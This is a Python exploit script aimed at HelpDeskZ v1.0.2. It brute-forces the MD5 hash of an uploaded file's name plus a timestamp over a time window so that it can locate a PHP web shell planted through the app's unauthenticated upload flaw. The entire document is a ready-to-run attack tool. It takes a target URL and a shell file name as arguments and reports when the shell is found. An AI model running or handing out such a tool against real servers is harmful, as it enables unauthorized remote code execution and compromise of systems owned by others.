#!/usr/bin/env python3

import hashlib
import time
import sys
import argparse
import requests

def banner():
    print("[*] Helpdeskz v1.0.2 - Unauthenticated shell upload hash guesser")
    print("[*] Original exploit upgraded for Python 3, better control and feedback\n")

def try_guess_url(base_url, file_name, timestamp_window, verbose):
    current_time = int(time.time())

    for offset in range(timestamp_window):
        candidate_time = current_time - offset
        plaintext = file_name + str(candidate_time)
        md5hash = hashlib.md5(plaintext.encode()).hexdigest()
        url = f"{base_url}{md5hash}.php"

        if verbose:
            print(f"[*] Trying: {url}")

        try:
            response = requests.head(url, headers={"User-Agent": "Mozilla/5.0"})
            if response.status_code == 200:
                print("\n[+] Shell found!")
                print(f"[+] URL: {url}")
                return True
        except requests.RequestException as e:
            print(f"[!] Request failed for {url}: {e}")

    print("\n[-] Sorry, no shell was found in the given time window.")
    return False

def main():
    banner()
    parser = argparse.ArgumentParser(description="Helpdeskz v1.0.2 Shell Upload Guess Tool")
    parser.add_argument("base_url", help="Base URL where shell might be (e.g., http://target.com/support/uploads/tickets/)")
    parser.add_argument("filename", help="Name of file uploaded (e.g., shell.php)")
    parser.add_argument("--window", type=int, default=300, help="Time window in seconds to brute-force (default: 300)")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")

    args = parser.parse_args()

    if not args.base_url.endswith("/"):
        args.base_url += "/"

    found = try_guess_url(args.base_url, args.filename, args.window, args.verbose)
    if not found:
        sys.exit(1)

if __name__ == "__main__":
    main()
